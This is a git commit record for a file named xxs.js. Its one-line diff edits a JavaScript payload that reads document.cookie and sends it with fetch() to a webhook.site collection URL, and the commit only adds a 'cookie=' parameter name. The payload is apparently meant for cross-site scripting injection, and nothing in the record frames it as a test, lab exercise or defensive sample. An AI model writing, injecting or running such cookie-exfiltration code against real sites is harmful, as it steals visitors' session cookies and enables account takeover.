6c0210c0a196b3ff5da82d16186df7b34898e5b8
Jon M Kuhl <jonmkuhl@gmail.com>
2023-10-17 14:11:36 -0700

    Update xxs.js
    added cookie =

--- xxs.js
+++ xxs.js
@@ -1,1 +1,1 @@
-fetch("https://webhook.site/67aaf8fc-eef3-4106-8bc6-a544a05383fc/?" + document.cookie);
+fetch("https://webhook.site/67aaf8fc-eef3-4106-8bc6-a544a05383fc/?cookie=" + document.cookie);
